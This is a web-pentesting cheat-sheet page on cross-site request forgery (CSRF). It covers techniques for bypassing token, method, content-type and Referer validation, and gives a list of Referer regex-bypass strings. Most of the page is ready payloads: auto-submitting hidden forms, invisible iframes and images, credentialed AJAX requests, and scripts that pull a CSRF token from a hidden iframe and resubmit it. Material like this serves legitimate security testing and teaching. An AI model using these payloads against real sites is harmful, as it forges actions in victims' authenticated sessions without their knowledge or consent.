---
menu: CSRF
title: CSRF (Cross-Site Request Forgery) - Web Applications Pentesting
---

#  Cross-Site Request Forgery

## At a Glance

Cross-Site Request Forgery (CSRF) is an attack
that forces an end user
into submitting a malicious request
on a web application
in which they’re currently authenticated.

Unlike XSS,
which exploits the trust a user has
for a particular site,
CSRF exploits
the trust that a site has
in a user's browser.
[^csrf-cgisecurity]

{{<note>}}
CSRF is not limited to web applications.
An attacker could embed scripting into
any document format allowing scripting.
{{</note>}}

## Methodology

{{< figure src="/images/csrf-cheatsheet.png" alt="CSRF Methodology" title="CSRF Methodology. Source: PayloadsAllTheThings." >}}

## Validation Bypass

### Parameters and Headers

Some applications validate parameters and headers
only if present.
Try removing token parameters/headers
or commonly validated headers such as
`Referer`, `Host`, or `Origin`.

### Different Token

Some applications validate the token
from a pool.
Meaning it is not tied to a user session
and **any other token may be valid**.

Other applications only validate
the length of the token.
**Strings of the same length may be valid**.

### HTTP Request Method

Sometimes applications validate the token
only under predefined methods.
For example,
try changing from `POST` to `GET`.

{{<note>}}
There are cases
where the method is defined by a parameter
or a custom header such as:

- X-HTTP-Method
- X-HTTP-Method-Override
- X-Method-Override
{{</note>}}

### Content Type

Like with the request method,
applications may validate the token
only for a predefined `Content-type`.
Try a different `Content-type` such as:

- `application/json`
- `application/x-url-encoded`
- `form-multipart`

### Referrer Policy [^referer-referrer-policy]

The `Referrer-Policy` header
defines what data is made available
in the `Referer` header.
Its purpose is to add privacy,
preventing information leaking.

Referrer validation may be bypassed by
hiding its value using the `no-referrer` policy.

```html
<a href="http://{{< param "war.rdomain" >}}" rel="noreferrer">
```

### Referer Regex Validation [^referer-bypass]

Use manipulated strings
to bypass `Referer` header regex validation.

```txt
https://0xffsec.com [no protected]
https://0xffsec.com?safe_com
https://0xffsec.com;safe_com
https://0xffsec.com/safe_com/../target.file
https://safe_com.0xffsec.com
https://0xffsecsafe_com
https://safe_com@0xffsec.com
https://0xffsec.com#safe_com
https://0xffsec.com\.safe_com
https://0xffsec.com/.safe_com
https://saf.com
https://safez.com
file://safe_com
```

## Payloads

### HTML GET - User Interaction

```html
<a href="http://{{< param "war.rdomain" >}}/user/update/?username=0xffsec">Click Here!</a>
```

### HTML GET - No Interaction

```html
<img src="http://{{< param "war.rdomain" >}}/user/update/?username=0xffsec">
```

```html
<iframe src="http://{{< param "war.rdomain" >}}/user/update/?username=0xffsec" style="display:none;"></iframe>
```

### FORM GET - No Interaction

```html
<script>history.pushState('', '', '/')</script>
<form id="csrf_form" method="GET" action="http://{{< param "war.rdomain" >}}/user/update/">
    <input type="hidden" name="username" value="0xffsec" />
    <input type="submit" value="Submit" />
</form>
<script>
    document.getElementById("csrf_form").submit();
</script>
```

### FORM POST - User Interaction

```html
<form action="http://{{< param "war.rdomain" >}}/user/update/" enctype="text/plain" method="POST">
    <input name="username" type="hidden" value="0xffsec" />
    <input type="submit" value="Submit" />
</form>
```

### FORM POST - No Interaction

```html
<script>history.pushState('', '', '/')</script>
<form id="csrf_form" action="http://{{< param "war.rdomain" >}}/user/update/" enctype="text/plain" method="POST">
    <input name="username" type="hidden" value="0xffsec" />
</form>
<script>
    document.getElementById("csrf_form").submit();
</script>
```

### AJAX GET

```javascript
var url = "http://{{< param "war.rdomain" >}}/user/update/?username=0xffsec"
var xhr = new XMLHttpRequest();
xhr.open("GET", url);
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.send();
```

### AJAX POST

```javascript
var url = "http://{{< param "war.rdomain" >}}/user/update/"
var xhr = new XMLHttpRequest();
xhr.open("POST", url, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("username=0xffsec");
```

```javascript
var url = "http://{{< param "war.rdomain" >}}/user/update/"
var xhr = new XMLHttpRequest();
xhr.open("POST", url, true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"username":0xffsec}');
```

{{<note>}}
AS mention [before](#content-type), try with different content types:

- `xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");`
- `xhr.setRequestHeader("Content-Type", "multipart/form-data");`
{{</note>}}

### Get Token from iFrame

```html
<script>
function getToken(){
    var iframe = document.getElementById("iframe");
    var doc = iframe.contentDocument ? iframe.contentDocument: iframe.contentWindow.document;
    var token = doc.getElementsByName("user_token")[0].value;
    console.log(token)
}
</script>
<iframe id="iframe" onload="javascript:getToken();" src="http://{{< param "war.rdomain" >}}/user/update/" style="display:none;"></iframe>
```

### Get Token with Ajax

```javascript
var url = "http://{{< param "war.rdomain" >}}/user/update/"
var xhr = new XMLHttpRequest();
xhr.responseType = "document";
xhr.open("GET", url, true);
xhr.onload = function (e) {
    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
        var token = xhr.response.getElementsByName("user_token")[0].value;
        console.log(token);
    }
};
xhr.send();
```

### CSRF Token Example

This is **just one** example.
Use the token with
any of the payloads mention earlier.

```html
<script charset="utf-8">
function setTokenAndSend(token){
    document.getElementsByName("user_token")[0].value = token
    document.getElementById("csrf_form").submit();
}
function getToken(){
    var iframe = document.getElementById("iframe");
    var doc = iframe.contentDocument ? iframe.contentDocument: iframe.contentWindow.document;
    var token = doc.getElementsByName("user_token")[0].value;
    setTokenAndSend(token)
}
</script>
<iframe id="iframe" onload="javascript:getToken();" src="http://{{< param "war.rdomain" >}}/user/update/" style="display:none;"></iframe>
<form id="csrf_form" action="http://{{< param "war.rdomain" >}}/user/update/" enctype="text/plain" method="POST">
    <input name="username" type="hidden" value="0xffsec" />
    <input name="user_token" type="hidden" value="set_by_js" />
</form>
```

## Further Reading

- [MDN - Cross Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [OWASP - CSRF](https://owasp.org/www-community/attacks/csrf)
- [OWASP - Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger - Cross-site request forgery](https://portswigger.net/web-security/csrf)
- [PortSwigger - XSS vs CSRF](https://portswigger.net/web-security/csrf/xss-vs-csrf)

[^csrf-cgisecurity]: “The Cross-Site Request Forgery (CSRF/XSRF) FAQ.” CGISecurity - Website and Application Security News, https://www.cgisecurity.com/csrf-faq.html.
[^swissky-csrf]: swisskyrepo. “PayloadsAllTheThings/CSRF Injection at Master.” GitHub, https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection.
[^referer-bypass]: “Bypass Referer Check Logic for CSRF.” HAHWUL, https://www.hahwul.com/2019/10/11/bypass-referer-check-logic-for-csrf/.
[^referer-referrer-policy]: “Referer and Referrer-Policy Best Practices.” Web.Dev, https://web.dev/referrer-best-practices/.
